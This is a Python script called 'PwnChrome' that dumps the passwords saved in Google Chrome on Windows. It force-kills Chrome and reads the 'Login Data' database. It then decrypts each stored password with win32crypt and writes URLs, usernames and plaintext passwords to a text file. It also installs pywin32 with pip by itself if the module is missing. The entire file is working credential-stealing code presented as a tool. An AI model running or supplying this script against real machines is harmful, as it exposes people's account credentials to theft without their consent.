import os
import platform
import sqlite3
import subprocess
import sys

print("""
██████╗ ██╗    ██╗███╗   ██╗ ██████╗██╗  ██╗██████╗  ██████╗ ███╗   ███╗███████╗
██╔══██╗██║    ██║████╗  ██║██╔════╝██║  ██║██╔══██╗██╔═══██╗████╗ ████║██╔════╝
██████╔╝██║ █╗ ██║██╔██╗ ██║██║     ███████║██████╔╝██║   ██║██╔████╔██║█████╗  
██╔═══╝ ██║███╗██║██║╚██╗██║██║     ██╔══██║██╔══██╗██║   ██║██║╚██╔╝██║██╔══╝  
██║     ╚███╔███╔╝██║ ╚████║╚██████╗██║  ██║██║  ██║╚██████╔╝██║ ╚═╝ ██║███████╗
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝
""")


def main():
    paths = {
                "Windows": ["AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"],
                # "Darwin": ["Library", "Application Support", "Google", "Chrome", "Default", "Login Data"],
                # "Linux": [".config", "google-chrome", "default", "login data"]
            }

    if not platform.system() == "Windows":
        print(f"Your OS ({platform.system()}) is not supported. Sorry for the inconvenience.")
        sys.exit(0)

    try:
        import win32crypt

        # Goes to the home directory of user's PC,
        # pulls the installation path from "paths" dictionary.
        installation_path = os.path.join(*[os.path.expanduser("~")] + paths[platform.system()])

        if not os.path.exists(installation_path):
            # Notifies the user that the installation path for Google Chrome does not exist PC and quits the script.
            print("Installation path does not exist. Please check if Chrome is installed.\n")
            sys.exit(0)

        else:
            try:
                # Kills all Chrome tasks forcefully and silently.
                # /f: Specifies that the process to be forcefully terminated
                # /im (Image Name): Specifies the image name of the process to be terminated
                subprocess.check_output(["taskkill", "/f", "/im", "chrome.exe"], stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                pass

            # Connects to the database/data path.
            connect = sqlite3.connect(installation_path)
            cursor = connect.cursor()
            select_statement = "SELECT origin_url, username_value, password_value FROM logins"
            cursor.execute(select_statement)

            login_data = cursor.fetchall()

            with open("PwnChrome.txt", "w") as file:
                for url, username, password in login_data:
                    password = win32crypt.CryptUnprotectData(password)[1].decode("utf-8")
                    if not username and not password:
                        # If there is no data on a URL i.e if "Don't Save" entries are present in the data,
                        # it will skip them to the amount of empty lines.
                        continue
                    file.write(
                        f"URL: {url}\n"
                        f"USERNAME: {username!r}\n"
                        f"PASSWORD: {password!r}\n"
                        "==================================================\n")
            print("\n'PwnChrome.txt' is placed at the same location as your 'PwnChrome.py'\n")
            sys.exit(0)

    except ModuleNotFoundError:
        # If "pywin32" module is not present in Python it will display the following message.
        print("'pywin32' is not present. Installing 'pywin32':\n")
        # Installs 'pywin32' module for the user.
        subprocess.run([sys.executable, "-m", "pip", "install", "pywin32"])
        print("\nRestarting...")
        # Restarts the script.
        os.execl(sys.executable, sys.executable, *sys.argv)


if __name__ == '__main__':
    main()
